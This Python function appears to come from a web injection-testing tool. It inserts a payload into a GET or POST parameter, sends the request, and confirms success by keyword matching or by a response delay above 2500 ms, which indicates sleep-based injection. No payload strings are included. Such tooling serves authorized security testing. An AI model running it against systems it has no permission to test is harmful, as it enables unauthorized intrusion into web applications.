def execute_attack(url: str, param: str, payload_def: Dict,
                   http_method: str = "GET",
                   form_inputs: List[Dict] = None,
                   timeout: int = 0) -> Dict:
    """Execute attack: inject payload, send request, analyze response.

    Args:
        url: Target URL
        param: Parameter name to target
        payload_def: Payload definition with name, payload, method, detect, match, tip
        http_method: GET or POST
        form_inputs: List of form input dicts for POST construction

    Returns:
        {"attack_url": str, "param": str, "payload_name": str,
         "response": dict, "analysis": dict}
    """
    payload = payload_def["payload"]
    method = payload_def.get("method", "append")
    detect = payload_def.get("detect", "normal")
    match_words = payload_def.get("match", [])
    post_data = None
    if http_method == "POST":
        # Build POST body from form_inputs or fallback to simple param=payload
        form_dict = {}
        if form_inputs:
            for inp in form_inputs:
                name = inp.get("name", "")
                val = inp.get("value", "")
                if name == param:
                    if method == "replace":
                        form_dict[name] = payload
                    else:
                        form_dict[name] = val + payload
                else:
                    form_dict[name] = val
        else:
            # Simple POST: just the target param
            form_dict[param] = payload
        post_data = urlencode(form_dict).encode("utf-8")
        attack_url = url
    else:
        attack_url = inject_payload(url, param, payload, method)
    req_timeout = timeout if timeout > 0 else DEFAULT_TIMEOUT
    if detect == "timeout":
        req_timeout = 8
    resp = send_request(attack_url, timeout=req_timeout, method=http_method,
                        post_data=post_data)
    if detect == "timeout":
        elapsed = resp.get("elapsed_ms", 0)
        if elapsed > 2500:
            analysis = {
                "success": True, "confidence": "Very High",
                "detail": f"Response time {elapsed}ms (>2500ms) - Sleep injection confirmed"
            }
        else:
            analysis = {
                "success": False, "confidence": "",
                "detail": f"Response time {elapsed}ms, sleep injection not confirmed"
            }
    else:
        analysis = analyze_response(resp.get("body", ""),
                                    {"detect": detect, "match": match_words})
    return {
        "attack_url": attack_url, "param": param,
        "payload_name": payload_def["name"],
        "response": resp, "analysis": analysis,
    }
